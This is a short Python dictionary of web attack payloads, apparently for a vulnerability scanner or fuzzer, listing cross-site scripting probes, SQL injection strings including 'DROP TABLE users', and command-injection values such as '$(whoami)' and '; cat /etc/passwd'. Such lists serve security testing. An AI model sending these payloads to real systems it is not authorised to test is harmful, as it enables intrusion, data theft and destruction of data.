PAYLOADS = {
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "'\"><script>alert('XSS')</script>",
        "<svg onload=alert('XSS')>"
    ],
    "sqli": [
        "' OR '1'='1",
        "admin' --",
        "' UNION SELECT NULL, NULL, NULL --",
        "'; DROP TABLE users; --",
        "1' OR '1'='1' --"
    ],
    "command_injection": [
        "; ls",
        "| ls",
        "&& whoami",
        "$(whoami)",
        "; cat /etc/passwd"
    ]
}

